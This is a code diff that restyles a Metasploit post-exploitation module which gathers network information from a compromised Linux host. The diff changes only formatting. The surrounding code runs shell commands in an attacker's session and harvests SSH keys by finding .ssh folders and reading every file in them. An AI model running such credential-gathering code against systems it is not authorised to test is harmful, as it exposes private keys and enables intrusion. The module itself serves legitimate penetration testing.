@@ -8,23 +8,25 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Linux::Priv
   include Msf::Post::Linux::System
 
-
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Linux Gather Network Information',
-        'Description'   => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Linux Gather Network Information',
+        'Description' => %q{
           This module gathers network information from the target system
           IPTables rules, interfaces, wireless information, open and listening
-          ports, active network connections, DNS information and SSH information.},
-        'License'       => MSF_LICENSE,
-        'Author'        =>
-          [
-            'ohdae <bindshell[at]live.com>', # minor additions, modifications & testing
-            'Stephen Haywood <averagesecurityguy[at]gmail.com>', # enum_linux
-          ],
-        'Platform'      => ['linux'],
-        'SessionTypes'  => ['shell', 'meterpreter']
-      ))
+          ports, active network connections, DNS information and SSH information.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'ohdae <bindshell[at]live.com>', # minor additions, modifications & testing
+          'Stephen Haywood <averagesecurityguy[at]gmail.com>', # enum_linux
+        ],
+        'Platform' => ['linux'],
+        'SessionTypes' => ['shell', 'meterpreter']
+      )
+    )
   end
 
   # Run Method for when run command is issued
@@ -68,11 +70,10 @@ class MetasploitModule < Msf::Post
     save("Wireless information", wireless)
     save("Listening ports", open_ports)
     save("If-Up/If-Down", updown)
-
   end
 
   # Save enumerated data
-  def save(msg, data, ctype="text/plain")
+  def save(msg, data, ctype = "text/plain")
     unless data and !data.empty?
       print_bad("Unable to get data for #{msg}")
       return
@@ -101,6 +102,7 @@ class MetasploitModule < Msf::Post
     vprint_status("Execute: #{cmd}")
     output = cmd_exec(cmd + " || echo #{verification_token}")
     return nil if output.include?(verification_token)
+
     return output
   end
 
@@ -113,7 +115,7 @@ class MetasploitModule < Msf::Post
   def get_ssh_keys
     keys = []
 
-    #Look for .ssh folder, "~/" might not work everytime
+    # Look for .ssh folder, "~/" might not work everytime
     vprint_status("Execute: /usr/bin/find / -maxdepth 3 -name .ssh")
     dirs = cmd_exec("/usr/bin/find / -maxdepth 3 -name .ssh").split("\n")
     ssh_base = ''
@@ -131,7 +133,8 @@ class MetasploitModule < Msf::Post
     files = execute("/bin/ls -a #{ssh_base}").chomp.split()
 
     files.each do |k|
-      next if k =~/^(\.+)$/
+      next if k =~ /^(\.+)$/
+
       this_key = cat_file("#{ssh_base}/#{k}")
       keys << this_key
     end
